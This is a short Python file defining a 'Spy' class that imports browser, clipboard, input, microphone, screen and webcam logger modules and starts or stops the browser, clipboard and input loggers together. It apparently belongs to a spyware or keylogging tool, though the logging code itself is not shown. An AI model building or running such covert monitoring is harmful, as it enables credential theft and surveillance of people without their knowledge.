from core.loggers.browser_logger import BrowserLogger
from core.loggers.clipboard_logger import ClipboardLogger
from core.loggers.input_logger import InputLogger
from core.loggers.microphone_logger import MicrophoneLogger
from core.loggers.screen_logger import ScreenLogger
from core.loggers.webcam_logger import WebcamLogger

class Spy:
    def __init__(self):
        self.browser_logger = BrowserLogger()
        self.clipboard_logger = ClipboardLogger()
        self.input_logger = InputLogger()

        self.loggers = []
        self.loggers.extend([
            self.browser_logger,
            self.clipboard_logger,
            self.input_logger
        ])

    def start(self):
        for logger in self.loggers:
            logger.start()

    def stop(self):
        for logger in self.loggers:
            logger.stop()